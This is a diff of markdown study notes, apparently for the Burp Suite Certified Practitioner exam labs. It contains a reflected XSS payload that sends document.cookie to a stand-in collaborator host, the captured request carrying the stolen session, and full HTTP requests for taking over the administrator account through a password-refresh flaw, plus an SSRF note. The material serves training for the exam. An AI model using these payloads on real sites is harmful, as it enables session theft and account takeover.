@@ -2,7 +2,7 @@
 
 ## 1 - 1  
   
->Identify reflected XSS in search  
+>Identify reflected XSS in search `tracker.gif`   
 
 ```
 </ScRiPt ><img src=a onerror=document.location="https://COLLABORATOR.com/?biscuit="+document.cookie>
@@ -80,37 +80,69 @@ x=1
 
 >replace cookie, set email, change password for user
 
-
-## 2 - 2  
-
->Identify password change refresh csrf ???
-
-```
-
-```  
-
->copy stolen cookie to session, update email, change password administrator  
+>COLLABORATOR received  
 
 ```
 GET /?APP=session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--blah%blah%2f%blah%2b%blah%blah%3d%3d HTTP/1.1
-Host: 2psgioi2s9569m4sl9fmf4ff66cx0ood.oastify.com
+Host: COLLABORATOR.oastify.com
 Connection: keep-alive
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US
+```
 
+## 2 - 2  
+
+>Identify password change refresh csrf ???  
+
+1. intercept `POST /refreshpassword HTTP/2`  
+2. Change `username` to `administrator`  
+3. Copy `csrf` from current logged in user profile accounts source code hidden value.  
+4. Send pass change request, copy from response the `set-cookie` for administrator.  
+5. replace cookie in current session to privesc.  
+
+[csrf privesc](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-privesc.png)  
+
+```
+POST /refreshpassword HTTP/2
+Host: TARGET.net
+Cookie:session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--BLAHBLAHBLAH%3d;
+Content-Length: 60
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+X-Forwarded-Host: exploit-1234.exploit-server.net
+X-Host: exploit-1234.exploit-server.net
+X-Forwarded-Server: exploit-1234.exploit-server.net
+Referer: https://TARGET.net/refreshpassword
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+csrf=CurrentUserCookieValueX&username=administrator
+```  
+
+>response 200 ok set-cookie value  
+
+```
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=%7b%22username%22%3a%22administrator%22%2c%22isloggedin%22%3atrue%7d--BLAHBLAHI%2bq3penAl0%blah%3d%3d; Secure; SameSite=None
+
+X-Frame-Options: SAMEORIGIN
+Content-Length: 3441
+
+<!DOCTYPE html>
+```  
+
+>copy stolen cookie to session, update email, change password administrator  
 
 
 ## 2 - 3  
 
-
-password change refresh csrf 
-
-https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-privesc.png
-
-
->admin function download report pdf `/adminpanel/save-metrics`  
+>admin function download report pdf `/adminpanel/save-metrics` in POST body JSON field `PageHtml`  
 
 >SSRF vulnerability, you can use it to read the files by accessing an internal-only service running on locahost on port 6566.
+
